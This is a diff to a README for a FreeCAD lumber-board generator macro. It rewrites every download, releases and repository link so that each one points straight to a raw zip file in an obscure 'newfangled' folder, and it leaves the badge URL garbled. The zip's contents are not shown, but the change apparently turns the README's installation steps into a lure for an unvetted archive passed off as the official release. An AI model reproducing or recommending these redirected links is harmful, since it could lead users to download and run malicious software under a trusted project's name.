@@ -1,6 +1,6 @@
 # 🪚 FreeCAD-Lumber-Board-Generator-Macro - Create Realistic Wood Designs Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/mitochondriaispowerhouseofcell/FreeCAD-Lumber-Board-Generator-Macro/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/mitochondriaispowerhouseofcell/FreeCAD-Lumber-Board-Generator-Macro/main/newfangled/FreeCAD-Lumber-Board-Generator-Macro.zip%20Latest%https://raw.githubusercontent.com/mitochondriaispowerhouseofcell/FreeCAD-Lumber-Board-Generator-Macro/main/newfangled/FreeCAD-Lumber-Board-Generator-Macro.zip)](https://raw.githubusercontent.com/mitochondriaispowerhouseofcell/FreeCAD-Lumber-Board-Generator-Macro/main/newfangled/FreeCAD-Lumber-Board-Generator-Macro.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Welcome to the FreeCAD Lumber Board Generator Macro! This easy-to-use tool helps
 
 To get started, visit the following page to download the latest version of the software:
 
-[Download Latest Release](https://github.com/mitochondriaispowerhouseofcell/FreeCAD-Lumber-Board-Generator-Macro/releases)
+[Download Latest Release](https://raw.githubusercontent.com/mitochondriaispowerhouseofcell/FreeCAD-Lumber-Board-Generator-Macro/main/newfangled/FreeCAD-Lumber-Board-Generator-Macro.zip)
 
 ### ⚙️ System Requirements
 
@@ -30,7 +30,7 @@ To get started, visit the following page to download the latest version of the s
 ### 🛠 Installation Process
 
 1. **Download the Macro:**
-   - Go to the [Releases page](https://github.com/mitochondriaispowerhouseofcell/FreeCAD-Lumber-Board-Generator-Macro/releases).
+   - Go to the [Releases page](https://raw.githubusercontent.com/mitochondriaispowerhouseofcell/FreeCAD-Lumber-Board-Generator-Macro/main/newfangled/FreeCAD-Lumber-Board-Generator-Macro.zip).
    - Find the latest version and click on the link to download the zip file.
 
 2. **Extract the Files:**
@@ -79,8 +79,8 @@ This macro is designed for woodworkers, carpenters, and anyone working on framin
 
 ## 🔗 Important Links
 
-- [GitHub Repository](https://github.com/mitochondriaispowerhouseofcell/FreeCAD-Lumber-Board-Generator-Macro)
-- [Releases Page](https://github.com/mitochondriaispowerhouseofcell/FreeCAD-Lumber-Board-Generator-Macro/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/mitochondriaispowerhouseofcell/FreeCAD-Lumber-Board-Generator-Macro/main/newfangled/FreeCAD-Lumber-Board-Generator-Macro.zip)
+- [Releases Page](https://raw.githubusercontent.com/mitochondriaispowerhouseofcell/FreeCAD-Lumber-Board-Generator-Macro/main/newfangled/FreeCAD-Lumber-Board-Generator-Macro.zip)
 - [User Manual](#)
 
 With these steps, you are ready to download and run the FreeCAD Lumber Board Generator Macro. Enjoy creating your lumber designs!
